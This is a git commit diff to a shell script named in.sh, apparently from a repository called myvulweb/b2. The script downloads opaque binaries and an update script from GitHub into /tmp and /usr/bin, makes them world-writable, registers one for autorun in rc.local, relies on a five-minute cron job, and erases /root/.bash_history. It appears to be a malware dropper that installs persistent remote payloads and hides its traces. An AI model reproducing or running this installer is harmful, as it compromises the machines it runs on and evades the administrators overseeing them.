5d2580973084277429a54850d6566197627dbf0e
test <test@testqq.com>
2019-01-13 15:06:08 +0800

    dddd

--- in.sh
+++ in.sh
@@ -1,6 +1,24 @@
 #!/bin/bash
 #
+
+
+
+
 #uninstall
+#
+#down and checkmd5
+
+wget https://github.com/myvulweb/b2/raw/master/libbus -O /tmp/libbus
+wget https://github.com/myvulweb/b2/raw/master/usrhost -O /tmp/usrhost 
+wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome -O /tmp/libhome
+
+wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /tmp/usrhost_ver.txt
+wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /tmp/linux-update.sh
+
+wget https://raw.githubusercontent.com/myvulweb/b2/master/md5 -O /tmp/mymd5
+
+
+
 sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab
 sed -i '\/usr\/bin\/libhome/d' /etc/rc.d/rc.local
 
@@ -18,16 +36,15 @@ rm -rf /usr/bin/usrhost_ver.txt
 #uninstall finish
 
 #my daemon and add autorun
-wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome -O /usr/bin/libhome
+
 chmod 777 /usr/bin/libhome
 echo '/usr/bin/libhome'>>/etc/rc.d/rc.local
 
-wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt
-wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /usr/bin/linux-update.sh
+
 chmod 777 /usr/bin/linux-update.sh
-wget https://github.com/myvulweb/b2/raw/master/usrhost -O /usr/bin/usrhost 
+
 chmod 777 /usr/bin/usrhost
-wget https://github.com/myvulweb/b2/raw/master/libbus -O /usr/bin/libbus
+
 chmod 777 /usr/bin/libbus
 
 echo >/root/.bash_history
